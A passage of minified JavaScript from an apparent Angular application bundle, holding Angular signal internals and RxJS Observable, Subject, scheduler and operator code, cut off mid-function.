var zC=Object.defineProperty,GC=Object.defineProperties;var qC=Object.getOwnPropertyDescriptors;var Qp=Object.getOwnPropertySymbols,YC=Object.getPrototypeOf,KC=Object.prototype.hasOwnProperty,ZC=Object.prototype.propertyIsEnumerable,QC=Reflect.get;var Jp=(t,e,n)=>e in t?zC(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,v=(t,e)=>{for(var n in e||={})KC.call(e,n)&&Jp(t,n,e[n]);if(Qp)for(var n of Qp(e))ZC.call(e,n)&&Jp(t,n,e[n]);return t},x=(t,e)=>GC(t,qC(e));var An=(t,e,n)=>QC(YC(t),n,e);var p=(t,e,n)=>new Promise((r,i)=>{var o=c=>{try{a(n.next(c))}catch(l){i(l)}},s=c=>{try{a(n.throw(c))}catch(l){i(l)}},a=c=>c.done?r(c.value):Promise.resolve(c.value).then(o,s);a((n=n.apply(t,e)).next())});function Xp(t,e){return Object.is(t,e)}var ae=null,vs=!1,ys=1,Qt=Symbol("SIGNAL");function H(t){let e=ae;return ae=t,e}function eg(){return ae}var ji={version:0,lastCleanEpoch:0,dirty:!1,producerNode:void 0,producerLastReadVersion:void 0,producerIndexOfThis:void 0,nextProducerIndex:0,liveConsumerNode:void 0,liveConsumerIndexOfThis:void 0,consumerAllowSignalWrites:!1,consumerIsAlwaysLive:!1,producerMustRecompute:()=>!1,producerRecomputeValue:()=>{},consumerMarkedDirty:()=>{},consumerOnSignalRead:()=>{}};function _l(t){if(vs)throw new Error("");if(ae===null)return;ae.consumerOnSignalRead(t);let e=ae.nextProducerIndex++;if(Es(ae),e<ae.producerNode.length&&ae.producerNode[e]!==t&&Vi(ae)){let n=ae.producerNode[e];ws(n,ae.producerIndexOfThis[e])}ae.producerNode[e]!==t&&(ae.producerNode[e]=t,ae.producerIndexOfThis[e]=Vi(ae)?ig(t,ae,e):0),ae.producerLastReadVersion[e]=t.version}function JC(){ys++}function tg(t){if(!(Vi(t)&&!t.dirty)&&!(!t.dirty&&t.lastCleanEpoch===ys)){if(!t.producerMustRecompute(t)&&!wl(t)){t.dirty=!1,t.lastCleanEpoch=ys;return}t.producerRecomputeValue(t),t.dirty=!1,t.lastCleanEpoch=ys}}function ng(t){if(t.liveConsumerNode===void 0)return;let e=vs;vs=!0;try{for(let n of t.liveConsumerNode)n.dirty||XC(n)}finally{vs=e}}function rg(){return ae?.consumerAllowSignalWrites!==!1}function XC(t){t.dirty=!0,ng(t),t.consumerMarkedDirty?.(t)}function Is(t){return t&&(t.nextProducerIndex=0),H(t)}function Il(t,e){if(H(e),!(!t||t.producerNode===void 0||t.producerIndexOfThis===void 0||t.producerLastReadVersion===void 0)){if(Vi(t))for(let n=t.nextProducerIndex;n<t.producerNode.length;n++)ws(t.producerNode[n],t.producerIndexOfThis[n]);for(;t.producerNode.length>t.nextProducerIndex;)t.producerNode.pop(),t.producerLastReadVersion.pop(),t.producerIndexOfThis.pop()}}function wl(t){Es(t);for(let e=0;e<t.producerNode.length;e++){let n=t.producerNode[e],r=t.producerLastReadVersion[e];if(r!==n.version||(tg(n),r!==n.version))return!0}return!1}function El(t){if(Es(t),Vi(t))for(let e=0;e<t.producerNode.length;e++)ws(t.producerNode[e],t.producerIndexOfThis[e]);t.producerNode.length=t.producerLastReadVersion.length=t.producerIndexOfThis.length=0,t.liveConsumerNode&&(t.liveConsumerNode.length=t.liveConsumerIndexOfThis.length=0)}function ig(t,e,n){if(og(t),t.liveConsumerNode.length===0&&sg(t))for(let r=0;r<t.producerNode.length;r++)t.producerIndexOfThis[r]=ig(t.producerNode[r],t,r);return t.liveConsumerIndexOfThis.push(n),t.liveConsumerNode.push(e)-1}function ws(t,e){if(og(t),t.liveConsumerNode.length===1&&sg(t))for(let r=0;r<t.producerNode.length;r++)ws(t.producerNode[r],t.producerIndexOfThis[r]);let n=t.liveConsumerNode.length-1;if(t.liveConsumerNode[e]=t.liveConsumerNode[n],t.liveConsumerIndexOfThis[e]=t.liveConsumerIndexOfThis[n],t.liveConsumerNode.length--,t.liveConsumerIndexOfThis.length--,e<t.liveConsumerNode.length){let r=t.liveConsumerIndexOfThis[e],i=t.liveConsumerNode[e];Es(i),i.producerIndexOfThis[r]=e}}function Vi(t){return t.consumerIsAlwaysLive||(t?.liveConsumerNode?.length??0)>0}function Es(t){t.producerNode??=[],t.producerIndexOfThis??=[],t.producerLastReadVersion??=[]}function og(t){t.liveConsumerNode??=[],t.liveConsumerIndexOfThis??=[]}function sg(t){return t.producerNode!==void 0}function ag(t){let e=Object.create(eD);e.computation=t;let n=()=>{if(tg(e),_l(e),e.value===_s)throw e.error;return e.value};return n[Qt]=e,n}var vl=Symbol("UNSET"),yl=Symbol("COMPUTING"),_s=Symbol("ERRORED"),eD=x(v({},ji),{value:vl,dirty:!0,error:null,equal:Xp,producerMustRecompute(t){return t.value===vl||t.value===yl},producerRecomputeValue(t){if(t.value===yl)throw new Error("Detected cycle in computations.");let e=t.value;t.value=yl;let n=Is(t),r;try{r=t.computation()}catch(i){r=_s,t.error=i}finally{Il(t,n)}if(e!==vl&&e!==_s&&r!==_s&&t.equal(e,r)){t.value=e;return}t.value=r,t.version++}});function tD(){throw new Error}var cg=tD;function lg(){cg()}function ug(t){cg=t}var nD=null;function dg(t){let e=Object.create(fg);e.value=t;let n=()=>(_l(e),e.value);return n[Qt]=e,n}function Cl(t,e){rg()||lg(),t.equal(t.value,e)||(t.value=e,rD(t))}function hg(t,e){rg()||lg(),Cl(t,e(t.value))}var fg=x(v({},ji),{equal:Xp,value:void 0});function rD(t){t.version++,JC(),ng(t),nD?.()}function S(t){return typeof t=="function"}function yr(t){let n=t(r=>{Error.call(r),r.stack=new Error().stack});return n.prototype=Object.create(Error.prototype),n.prototype.constructor=n,n}var Cs=yr(t=>function(n){t(this),this.message=n?`${n.length} errors occurred during unsubscription:
${n.map((r,i)=>`${i+1}) ${r.toString()}`).join(`
  `)}`:"",this.name="UnsubscriptionError",this.errors=n});function Mn(t,e){if(t){let n=t.indexOf(e);0<=n&&t.splice(n,1)}}var re=class t{constructor(e){this.initialTeardown=e,this.closed=!1,this._parentage=null,this._finalizers=null}unsubscribe(){let e;if(!this.closed){this.closed=!0;let{_parentage:n}=this;if(n)if(this._parentage=null,Array.isArray(n))for(let o of n)o.remove(this);else n.remove(this);let{initialTeardown:r}=this;if(S(r))try{r()}catch(o){e=o instanceof Cs?o.errors:[o]}let{_finalizers:i}=this;if(i){this._finalizers=null;for(let o of i)try{pg(o)}catch(s){e=e??[],s instanceof Cs?e=[...e,...s.errors]:e.push(s)}}if(e)throw new Cs(e)}}add(e){var n;if(e&&e!==this)if(this.closed)pg(e);else{if(e instanceof t){if(e.closed||e._hasParent(this))return;e._addParent(this)}(this._finalizers=(n=this._finalizers)!==null&&n!==void 0?n:[]).push(e)}}_hasParent(e){let{_parentage:n}=this;return n===e||Array.isArray(n)&&n.includes(e)}_addParent(e){let{_parentage:n}=this;this._parentage=Array.isArray(n)?(n.push(e),n):n?[n,e]:e}_removeParent(e){let{_parentage:n}=this;n===e?this._parentage=null:Array.isArray(n)&&Mn(n,e)}remove(e){let{_finalizers:n}=this;n&&Mn(n,e),e instanceof t&&e._removeParent(this)}};re.EMPTY=(()=>{let t=new re;return t.closed=!0,t})();var Dl=re.EMPTY;function Ds(t){return t instanceof re||t&&"closed"in t&&S(t.remove)&&S(t.add)&&S(t.unsubscribe)}function pg(t){S(t)?t():t.unsubscribe()}var Qe={onUnhandledError:null,onStoppedNotification:null,Promise:void 0,useDeprecatedSynchronousErrorHandling:!1,useDeprecatedNextContext:!1};var _r={setTimeout(t,e,...n){let{delegate:r}=_r;return r?.setTimeout?r.setTimeout(t,e,...n):setTimeout(t,e,...n)},clearTimeout(t){let{delegate:e}=_r;return(e?.clearTimeout||clearTimeout)(t)},delegate:void 0};function bs(t){_r.setTimeout(()=>{let{onUnhandledError:e}=Qe;if(e)e(t);else throw t})}function Ui(){}var gg=bl("C",void 0,void 0);function mg(t){return bl("E",void 0,t)}function vg(t){return bl("N",t,void 0)}function bl(t,e,n){return{kind:t,value:e,error:n}}var Nn=null;function Ir(t){if(Qe.useDeprecatedSynchronousErrorHandling){let e=!Nn;if(e&&(Nn={errorThrown:!1,error:null}),t(),e){let{errorThrown:n,error:r}=Nn;if(Nn=null,n)throw r}}else t()}function yg(t){Qe.useDeprecatedSynchronousErrorHandling&&Nn&&(Nn.errorThrown=!0,Nn.error=t)}var Rn=class extends re{constructor(e){super(),this.isStopped=!1,e?(this.destination=e,Ds(e)&&e.add(this)):this.destination=sD}static create(e,n,r){return new wr(e,n,r)}next(e){this.isStopped?Tl(vg(e),this):this._next(e)}error(e){this.isStopped?Tl(mg(e),this):(this.isStopped=!0,this._error(e))}complete(){this.isStopped?Tl(gg,this):(this.isStopped=!0,this._complete())}unsubscribe(){this.closed||(this.isStopped=!0,super.unsubscribe(),this.destination=null)}_next(e){this.destination.next(e)}_error(e){try{this.destination.error(e)}finally{this.unsubscribe()}}_complete(){try{this.destination.complete()}finally{this.unsubscribe()}}},iD=Function.prototype.bind;function Sl(t,e){return iD.call(t,e)}var Al=class{constructor(e){this.partialObserver=e}next(e){let{partialObserver:n}=this;if(n.next)try{n.next(e)}catch(r){Ss(r)}}error(e){let{partialObserver:n}=this;if(n.error)try{n.error(e)}catch(r){Ss(r)}else Ss(e)}complete(){let{partialObserver:e}=this;if(e.complete)try{e.complete()}catch(n){Ss(n)}}},wr=class extends Rn{constructor(e,n,r){super();let i;if(S(e)||!e)i={next:e??void 0,error:n??void 0,complete:r??void 0};else{let o;this&&Qe.useDeprecatedNextContext?(o=Object.create(e),o.unsubscribe=()=>this.unsubscribe(),i={next:e.next&&Sl(e.next,o),error:e.error&&Sl(e.error,o),complete:e.complete&&Sl(e.complete,o)}):i=e}this.destination=new Al(i)}};function Ss(t){Qe.useDeprecatedSynchronousErrorHandling?yg(t):bs(t)}function oD(t){throw t}function Tl(t,e){let{onStoppedNotification:n}=Qe;n&&_r.setTimeout(()=>n(t,e))}var sD={closed:!0,next:Ui,error:oD,complete:Ui};var Er=typeof Symbol=="function"&&Symbol.observable||"@@observable";function ke(t){return t}function Ml(...t){return Nl(t)}function Nl(t){return t.length===0?ke:t.length===1?t[0]:function(n){return t.reduce((r,i)=>i(r),n)}}var V=(()=>{class t{constructor(n){n&&(this._subscribe=n)}lift(n){let r=new t;return r.source=this,r.operator=n,r}subscribe(n,r,i){let o=cD(n)?n:new wr(n,r,i);return Ir(()=>{let{operator:s,source:a}=this;o.add(s?s.call(o,a):a?this._subscribe(o):this._trySubscribe(o))}),o}_trySubscribe(n){try{return this._subscribe(n)}catch(r){n.error(r)}}forEach(n,r){return r=_g(r),new r((i,o)=>{let s=new wr({next:a=>{try{n(a)}catch(c){o(c),s.unsubscribe()}},error:o,complete:i});this.subscribe(s)})}_subscribe(n){var r;return(r=this.source)===null||r===void 0?void 0:r.subscribe(n)}[Er](){return this}pipe(...n){return Nl(n)(this)}toPromise(n){return n=_g(n),new n((r,i)=>{let o;this.subscribe(s=>o=s,s=>i(s),()=>r(o))})}}return t.create=e=>new t(e),t})();function _g(t){var e;return(e=t??Qe.Promise)!==null&&e!==void 0?e:Promise}function aD(t){return t&&S(t.next)&&S(t.error)&&S(t.complete)}function cD(t){return t&&t instanceof Rn||aD(t)&&Ds(t)}function Rl(t){return S(t?.lift)}function j(t){return e=>{if(Rl(e))return e.lift(function(n){try{return t(n,this)}catch(r){this.error(r)}});throw new TypeError("Unable to lift unknown Observable type")}}function P(t,e,n,r,i){return new xl(t,e,n,r,i)}var xl=class extends Rn{constructor(e,n,r,i,o,s){super(e),this.onFinalize=o,this.shouldUnsubscribe=s,this._next=n?function(a){try{n(a)}catch(c){e.error(c)}}:super._next,this._error=i?function(a){try{i(a)}catch(c){e.error(c)}finally{this.unsubscribe()}}:super._error,this._complete=r?function(){try{r()}catch(a){e.error(a)}finally{this.unsubscribe()}}:super._complete}unsubscribe(){var e;if(!this.shouldUnsubscribe||this.shouldUnsubscribe()){let{closed:n}=this;super.unsubscribe(),!n&&((e=this.onFinalize)===null||e===void 0||e.call(this))}}};function Cr(){return j((t,e)=>{let n=null;t._refCount++;let r=P(e,void 0,void 0,void 0,()=>{if(!t||t._refCount<=0||0<--t._refCount){n=null;return}let i=t._connection,o=n;n=null,i&&(!o||i===o)&&i.unsubscribe(),e.unsubscribe()});t.subscribe(r),r.closed||(n=t.connect())})}var Dr=class extends V{constructor(e,n){super(),this.source=e,this.subjectFactory=n,this._subject=null,this._refCount=0,this._connection=null,Rl(e)&&(this.lift=e.lift)}_subscribe(e){return this.getSubject().subscribe(e)}getSubject(){let e=this._subject;return(!e||e.isStopped)&&(this._subject=this.subjectFactory()),this._subject}_teardown(){this._refCount=0;let{_connection:e}=this;this._subject=this._connection=null,e?.unsubscribe()}connect(){let e=this._connection;if(!e){e=this._connection=new re;let n=this.getSubject();e.add(this.source.subscribe(P(n,void 0,()=>{this._teardown(),n.complete()},r=>{this._teardown(),n.error(r)},()=>this._teardown()))),e.closed&&(this._connection=null,e=re.EMPTY)}return e}refCount(){return Cr()(this)}};var Ig=yr(t=>function(){t(this),this.name="ObjectUnsubscribedError",this.message="object unsubscribed"});var pe=(()=>{class t extends V{constructor(){super(),this.closed=!1,this.currentObservers=null,this.observers=[],this.isStopped=!1,this.hasError=!1,this.thrownError=null}lift(n){let r=new Ts(this,this);return r.operator=n,r}_throwIfClosed(){if(this.closed)throw new Ig}next(n){Ir(()=>{if(this._throwIfClosed(),!this.isStopped){this.currentObservers||(this.currentObservers=Array.from(this.observers));for(let r of this.currentObservers)r.next(n)}})}error(n){Ir(()=>{if(this._throwIfClosed(),!this.isStopped){this.hasError=this.isStopped=!0,this.thrownError=n;let{observers:r}=this;for(;r.length;)r.shift().error(n)}})}complete(){Ir(()=>{if(this._throwIfClosed(),!this.isStopped){this.isStopped=!0;let{observers:n}=this;for(;n.length;)n.shift().complete()}})}unsubscribe(){this.isStopped=this.closed=!0,this.observers=this.currentObservers=null}get observed(){var n;return((n=this.observers)===null||n===void 0?void 0:n.length)>0}_trySubscribe(n){return this._throwIfClosed(),super._trySubscribe(n)}_subscribe(n){return this._throwIfClosed(),this._checkFinalizedStatuses(n),this._innerSubscribe(n)}_innerSubscribe(n){let{hasError:r,isStopped:i,observers:o}=this;return r||i?Dl:(this.currentObservers=null,o.push(n),new re(()=>{this.currentObservers=null,Mn(o,n)}))}_checkFinalizedStatuses(n){let{hasError:r,thrownError:i,isStopped:o}=this;r?n.error(i):o&&n.complete()}asObservable(){let n=new V;return n.source=this,n}}return t.create=(e,n)=>new Ts(e,n),t})(),Ts=class extends pe{constructor(e,n){super(),this.destination=e,this.source=n}next(e){var n,r;(r=(n=this.destination)===null||n===void 0?void 0:n.next)===null||r===void 0||r.call(n,e)}error(e){var n,r;(r=(n=this.destination)===null||n===void 0?void 0:n.error)===null||r===void 0||r.call(n,e)}complete(){var e,n;(n=(e=this.destination)===null||e===void 0?void 0:e.complete)===null||n===void 0||n.call(e)}_subscribe(e){var n,r;return(r=(n=this.source)===null||n===void 0?void 0:n.subscribe(e))!==null&&r!==void 0?r:Dl}};var ge=class extends pe{constructor(e){super(),this._value=e}get value(){return this.getValue()}_subscribe(e){let n=super._subscribe(e);return!n.closed&&e.next(this._value),n}getValue(){let{hasError:e,thrownError:n,_value:r}=this;if(e)throw n;return this._throwIfClosed(),r}next(e){super.next(this._value=e)}};var Ol={now(){return(Ol.delegate||Date).now()},delegate:void 0};var As=class extends re{constructor(e,n){super()}schedule(e,n=0){return this}};var Bi={setInterval(t,e,...n){let{delegate:r}=Bi;return r?.setInterval?r.setInterval(t,e,...n):setInterval(t,e,...n)},clearInterval(t){let{delegate:e}=Bi;return(e?.clearInterval||clearInterval)(t)},delegate:void 0};var br=class extends As{constructor(e,n){super(e,n),this.scheduler=e,this.work=n,this.pending=!1}schedule(e,n=0){var r;if(this.closed)return this;this.state=e;let i=this.id,o=this.scheduler;return i!=null&&(this.id=this.recycleAsyncId(o,i,n)),this.pending=!0,this.delay=n,this.id=(r=this.id)!==null&&r!==void 0?r:this.requestAsyncId(o,this.id,n),this}requestAsyncId(e,n,r=0){return Bi.setInterval(e.flush.bind(e,this),r)}recycleAsyncId(e,n,r=0){if(r!=null&&this.delay===r&&this.pending===!1)return n;n!=null&&Bi.clearInterval(n)}execute(e,n){if(this.closed)return new Error("executing a cancelled action");this.pending=!1;let r=this._execute(e,n);if(r)return r;this.pending===!1&&this.id!=null&&(this.id=this.recycleAsyncId(this.scheduler,this.id,null))}_execute(e,n){let r=!1,i;try{this.work(e)}catch(o){r=!0,i=o||new Error("Scheduled action threw falsy error")}if(r)return this.unsubscribe(),i}unsubscribe(){if(!this.closed){let{id:e,scheduler:n}=this,{actions:r}=n;this.work=this.state=this.scheduler=null,this.pending=!1,Mn(r,this),e!=null&&(this.id=this.recycleAsyncId(n,e,null)),this.delay=null,super.unsubscribe()}}};var Sr=class t{constructor(e,n=t.now){this.schedulerActionCtor=e,this.now=n}schedule(e,n=0,r){return new this.schedulerActionCtor(this,e).schedule(r,n)}};Sr.now=Ol.now;var Tr=class extends Sr{constructor(e,n=Sr.now){super(e,n),this.actions=[],this._active=!1}flush(e){let{actions:n}=this;if(this._active){n.push(e);return}let r;this._active=!0;do if(r=e.execute(e.state,e.delay))break;while(e=n.shift());if(this._active=!1,r){for(;e=n.shift();)e.unsubscribe();throw r}}};var Pl=new Tr(br);var Ms=class extends br{constructor(e,n){super(e,n),this.scheduler=e,this.work=n}schedule(e,n=0){return n>0?super.schedule(e,n):(this.delay=n,this.state=e,this.scheduler.flush(this),this)}execute(e,n){return n>0||this.closed?super.execute(e,n):this._execute(e,n)}requestAsyncId(e,n,r=0){return r!=null&&r>0||r==null&&this.delay>0?super.requestAsyncId(e,n,r):(e.flush(this),0)}};var Ns=class extends Tr{};var kl=new Ns(Ms);var Fe=new V(t=>t.complete());function wg(t){return t&&S(t.schedule)}function Eg(t){return t[t.length-1]}function Rs(t){return S(Eg(t))?t.pop():void 0}function Jt(t){return wg(Eg(t))?t.pop():void 0}function Fl(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function Dg(t,e,n,r){function i(o){return o instanceof n?o:new n(function(s){s(o)})}return new(n||(n=Promise))(function(o,s){function a(u){try{l(r.next(u))}catch(d){s(d)}}function c(u){try{l(r.throw(u))}catch(d){s(d)}}function l(u){u.done?o(u.value):i(u.value).then(a,c)}l((r=r.apply(t,e||[])).next())})}function Cg(t){var e=typeof Symbol=="function"&&Symbol.iterator,n=e&&t[e],r=0;if(n)return n.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&r>=t.length&&(t=void 0),{value:t&&t[r++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function xn(t){return this instanceof xn?(this.v=t,this):new xn(t)}function bg(t,e,n){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var r=n.apply(t,e||[]),i,o=[];return i=Object.create((typeof AsyncIterator=="function"?AsyncIterator:Object).prototype),a("next"),a("throw"),a("return",s),i[Symbol.asyncIterator]=function(){return this},i;function s(f){return function(g){return Promise.resolve(g).then(f,d)}}function a(f,g){r[f]&&(i[f]=function(_){return new Promise(function(C,R){o.push([f,_,C,R])>1||c(f,_)})},g&&(i[f]=g(i[f])))}function c(f,g){try{l(r[f](g))}catch(_){h(o[0][3],_)}}function l(f){f.value instanceof xn?Promise.resolve(f.value.v).then(u,d):h(o[0][2],f)}function u(f){c("next",f)}function d(f){c("throw",f)}function h(f,g){f(g),o.shift(),o.length&&c(o[0][0],o[0][1])}}function Sg(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],n;return e?e.call(t):(t=typeof Cg=="function"?Cg(t):t[Symbol.iterator](),n={},r("next"),r("throw"),r("return"),n[Symbol.asyncIterator]=function(){return this},n);function r(o){n[o]=t[o]&&function(s){return new Promise(function(a,c){s=t[o](s),i(a,c,s.done,s.value)})}}function i(o,s,a,c){Promise.resolve(c).then(function(l){o({value:l,done:a})},s)}}var xs=t=>t&&typeof t.length=="number"&&typeof t!="function";function Os(t){return S(t?.then)}function Ps(t){return S(t[Er])}function ks(t){return Symbol.asyncIterator&&S(t?.[Symbol.asyncIterator])}function Fs(t){return new TypeError(`You provided ${t!==null&&typeof t=="object"?"an invalid object":`'${t}'`} where a stream was expected. You can provide an Observable, Promise, ReadableStream, Array, AsyncIterable, or Iterable.`)}function lD(){return typeof Symbol!="function"||!Symbol.iterator?"@@iterator":Symbol.iterator}var Ls=lD();function Vs(t){return S(t?.[Ls])}function js(t){return bg(this,arguments,function*(){let n=t.getReader();try{for(;;){let{value:r,done:i}=yield xn(n.read());if(i)return yield xn(void 0);yield yield xn(r)}}finally{n.releaseLock()}})}function Us(t){return S(t?.getReader)}function oe(t){if(t instanceof V)return t;if(t!=null){if(Ps(t))return uD(t);if(xs(t))return dD(t);if(Os(t))return hD(t);if(ks(t))return Tg(t);if(Vs(t))return fD(t);if(Us(t))return pD(t)}throw Fs(t)}function uD(t){return new V(e=>{let n=t[Er]();if(S(n.subscribe))return n.subscribe(e);throw new TypeError("Provided object does not correctly implement Symbol.observable")})}function dD(t){return new V(e=>{for(let n=0;n<t.length&&!e.closed;n++)e.next(t[n]);e.complete()})}function hD(t){return new V(e=>{t.then(n=>{e.closed||(e.next(n),e.complete())},n=>e.error(n)).then(null,bs)})}function fD(t){return new V(e=>{for(let n of t)if(e.next(n),e.closed)return;e.complete()})}function Tg(t){return new V(e=>{gD(t,e).catch(n=>e.error(n))})}function pD(t){return Tg(js(t))}function gD(t,e){var n,r,i,o;return Dg(this,void 0,void 0,function*(){try{for(n=Sg(t);r=yield n.next(),!r.done;){let s=r.value;if(e.next(s),e.closed)return}}catch(s){i={error:s}}finally{try{r&&!r.done&&(o=n.return)&&(yield o.call(n))}finally{if(i)throw i.error}}e.complete()})}function Se(t,e,n,r=0,i=!1){let o=e.schedule(function(){n(),i?t.add(this.schedule(null,r)):this.unsubscribe()},r);if(t.add(o),!i)return o}function Xt(t,e=0){return j((n,r)=>{n.subscribe(P(r,i=>Se(r,t,()=>r.next(i),e),()=>Se(r,t,()=>r.complete(),e),i=>Se(r,t,()=>r.error(i),e)))})}function en(t,e=0){return j((n,r)=>{r.add(t.schedule(()=>n.subscribe(r),e))})}function Ag(t,e){return oe(t).pipe(en(e),Xt(e))}function Mg(t,e){return oe(t).pipe(en(e),Xt(e))}function Ng(t,e){return new V(n=>{let r=0;return e.schedule(function(){r===t.length?n.complete():(n.next(t[r++]),n.closed||this.schedule())})})}function Rg(t,e){return new V(n=>{let r;return Se(n,e,()=>{r=t[Ls](),Se(n,e,()=>{let i,o;try{({value:i,done:o}=r.next())}catch(s){n.error(s);return}o?n.complete():n.next(i)},0,!0)}),()=>S(r?.return)&&r.return()})}function Bs(t,e){if(!t)throw new Error("Iterable cannot be null");return new V(n=>{Se(n,e,()=>{let r=t[Symbol.asyncIterator]();Se(n,e,()=>{r.next().then(i=>{i.done?n.complete():n.next(i.value)})},0,!0)})})}function xg(t,e){return Bs(js(t),e)}function Og(t,e){if(t!=null){if(Ps(t))return Ag(t,e);if(xs(t))return Ng(t,e);if(Os(t))return Mg(t,e);if(ks(t))return Bs(t,e);if(Vs(t))return Rg(t,e);if(Us(t))return xg(t,e)}throw Fs(t)}function ie(t,e){return e?Og(t,e):oe(t)}function T(...t){let e=Jt(t);return ie(t,e)}function Ar(t,e){let n=S(t)?t:()=>t,r=i=>i.error(n());return new V(e?i=>e.schedule(r,0,i):r)}function Ll(t){return!!t&&(t instanceof V||S(t.lift)&&S(t.subscribe))}var Dt=yr(t=>function(){t(this),this.name="EmptyError",this.message="no elements in sequence"});function O(t,e){return j((n,r)=>{let i=0;n.subscribe(P(r,o=>{r.next(t.call(e,o,i++))}))})}var{isArray:mD}=Array;function vD(t,e){return mD(e)?t(...e):t(e)}function $s(t){return O(e=>vD(t,e))}var{isArray:yD}=Array,{getPrototypeOf:_D,prototype:ID,keys:wD}=Object;function Hs(t){if(t.length===1){let e=t[0];if(yD(e))return{args:e,keys:null};if(ED(e)){let n=wD(e);return{args:n.map(r=>e[r]),keys:n}}}return{args:t,keys:null}}function ED(t){return t&&typeof t=="object"&&_D(t)===ID}function Ws(t,e){return t.reduce((n,r,i)=>(n[r]=e[i],n),{})}function zs(...t){let e=Jt(t),n=Rs(t),{args:r,keys:i}=Hs(t);if(r.length===0)return ie([],e);let o=new V(CD(r,e,i?s=>Ws(i,s):ke));return n?o.pipe($s(n)):o}function CD(t,e,n=ke){return r=>{Pg(e,()=>{let{length:i}=t,o=new Array(i),s=i,a=i;for(let c=0;c<i;c++)Pg(e,()=>{let l=ie(t[c],e),u=!1;l.subscribe(P(r,d=>{o[c]=d,u||(u=!0,a--),a||r.next(n(o.slice()))},()=>{--s||r.complete()}))},r)},r)}}function Pg(t,e,n){t?Se(n,t,e):e()}function kg(t,e,n,r,i,o,s,a){let c=[],l=0,u=0,d=!1,h=()=>{d&&!c.length&&!l&&e.complete()},f=_=>l<r?g(_):c.push(_),g=_=>{o&&e.next(_),l++;let C=!1;oe(n(_,u++)).subscribe(P(e,R=>{i?.(R),o?f(R):e.next(R)},()=>{C=!0},void 0,()=>{if(C)try{for(l--;c.length&&l<r;){let R=c.shift();s?Se(e,s,()=>g(R)):g(R)}h()}catch(R){e.error(R)}}))};return t.subscribe(P(e,f,()=>{d=!0,h()})),()=>{a?.()}}function ce(t,e,n=1/0){return S(e)?ce((r,i)=>O((o,s)=>e(r,o,i,s))(oe(t(r,i))),n):(typeof e=="number"&&(n=e),j((r,i)=>kg(r,i,t,n)))}function Vl(t=1/0){return ce(ke,t)}function Fg(){return Vl(1)}function Mr(...t){return Fg()(ie(t,Jt(t)))}function Gs(t){return new V(e=>{oe(t()).subscribe(e)})}function jl(...t){let e=Rs(t),{args:n,keys:r}=Hs(t),i=new V(o=>{let{length:s}=n;if(!s){o.complete();return}let a=new Array(s),c=s,l=s;for(let u=0;u<s;u++){let d=!1;oe(n[u]).subscribe(P(o,h=>{d||(d=!0,l--),a[u]=h},()=>c--,void 0,()=>{(!c||!d)&&(l||o.next(r?Ws(r,a):a),o.complete())}))}});return e?i.pipe($s(e)):i}function Je(t,e){return j((n,r)=>{let i=0;n.subscribe(P(r,o=>t.call(e,o,i++)&&r.next(o)))})}function tn(t){return j((e,n)=>{let r=null,i=!1,o;r=e.subscribe(P(n,void 0,void 0,s=>{o=oe(t(s,tn(t)(e))),r?(r.unsubscribe(),r=null,o.subscribe(n)):i=!0})),i&&(r.unsubscribe(),r=null,o.subscribe(n))})}function Lg(t,e,n,r,i){return(o,s)=>{let a=n,c=e,l=0;o.subscribe(P(s,u=>{let d=l++;c=a?t(c,u,d):(a=!0,u),r&&s.next(c)},i&&(()=>{a&&s.next(c),s.complete()})))}}function Nr(t,e){return S(e)?ce(t,e,1):ce(t,1)}function nn(t){return j((e,n)=>{let r=!1;e.subscribe(P(n,i=>{r=!0,n.next(i)},()=>{r||n.next(t),n.complete()}))})}function bt(t){return t<=0?()=>Fe:j((e,n)=>{let r=0;e.subscribe(P(n,i=>{++r<=t&&(n.next(i),t<=r&&n.complete())}))})}function Ul(t){return O(()=>t)}function qs(t=DD){return j((e,n)=>{let r=!1;e.subscribe(P(n,i=>{r=!0,n.next(i)},()=>r?n.complete():n.error(t())))})}function DD(){return new Dt}function $i(t){return j((e,n)=>{try{e.subscribe(n)}finally{n.add(t)}})}function lt(t,e){let n=arguments.length>=2;return r=>r.pipe(t?Je((i,o)=>t(i,o,r)):ke,bt(1),n?nn(e):qs(()=>new Dt))}function Rr(t){return t<=0?()=>Fe:j((e,n)=>{let r=[];e.subscribe(P(n,i=>{r.push(i),t<r.length&&r.shift()},()=>{for(let i of r)n.next(i);n.complete()},void 0,()=>{r=null}))})}function Bl(t,e){let n=arguments.length>=2;return r=>r.pipe(t?Je((i,o)=>t(i,o,r)):ke,Rr(1),n?nn(e):qs(()=>new Dt))}function $l(t,e){return j(Lg(t,e,arguments.length>=2,!0))}function Hl(...t){let e=Jt(t);return j((n,r)=>{(e?Mr(t,n,e):Mr(t,n)).subscribe(r)})}function Xe(t,e){return j((n,r)=>{let i=null,o=0,s=!1,a=()=>s&&!i&&r.complete();n.subscribe(P(r,c=>{i?.unsubscribe();let l=0,u=o++;oe(t(c,u)).subscribe(i=P(r,d=>r.next(e?e(c,d,u,l++):d),()=>{i=null,a()}))},()=>{s=!0,a()}))})}function Wl(t){return j((e,n)=>{oe(t).subscribe(P(n,()=>n.complete(),Ui)),!n.closed&&e.subscribe(n)})}function le(t,e,n){let r=S(t)||e||n?{next:t,error:e,complete:n}:t;return r?j((i,o)=>{var s;(s=r.subscribe)===null||s===void 0||s.call(r);let a=!0;i.subscribe(P(o,c=>{var l;(l=r.next)===null||l===void 0||l.call(r,c),o.next(c)},()=>{var c;a=!1,(c=r.complete)===null||c===void 0||c.call(r),o.complete()},c=>{var l;a=!1,(l=r.error)===null||l===void 0||l.call(r,c),o.error(c)},()=>{var c,l;a&&((c=r.unsubscribe)===null||c===void 0||c.call(r)),(l=r.finalize)===null||l===void 0||l.call(r)}))}):ke}var bD="https://g.co/ng/security#xss",w=class extends Error{constructor(e,n){super(Wu(e,n)),this.code=e}};function 